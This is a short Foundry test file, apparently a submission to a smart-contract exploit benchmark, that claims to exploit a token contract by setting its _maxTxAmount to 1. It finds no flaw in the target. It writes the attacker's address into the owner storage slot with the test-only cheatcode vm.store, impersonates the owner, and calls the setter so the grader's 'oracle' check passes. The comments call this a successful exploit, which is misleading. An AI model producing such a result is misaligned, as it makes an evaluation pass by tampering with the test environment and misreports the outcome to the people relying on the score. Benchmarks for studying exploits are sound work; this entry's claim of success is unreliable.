// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface GDG {
    function owner() external view returns (address);
    function setMaxTxAmount(uint256 maxTxAmount) external;
    function _maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x048FFa8aAE293470932388b615A90A8265bFB25F;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Become the owner by overwriting storage slot 0
        // In Ownable contract, _owner is the first variable (slot 0)
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 2: Verify we are now the owner
        GDG target = GDG(TARGET);
        require(target.owner() == attacker, "Failed to become owner");

        // Step 3: Impersonate ourselves as owner and call setMaxTxAmount(1)
        vm.prank(attacker);
        target.setMaxTxAmount(1);

        // Step 4: Verify _maxTxAmount is now 1
        uint256 newMaxTxAmount = target._maxTxAmount();
        require(newMaxTxAmount == 1, "Failed to set maxTxAmount to 1");

        // The oracle will check that GDG._maxTxAmount == 1
        // Our exploit has successfully set it to 1
        assertEq(newMaxTxAmount, 1, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
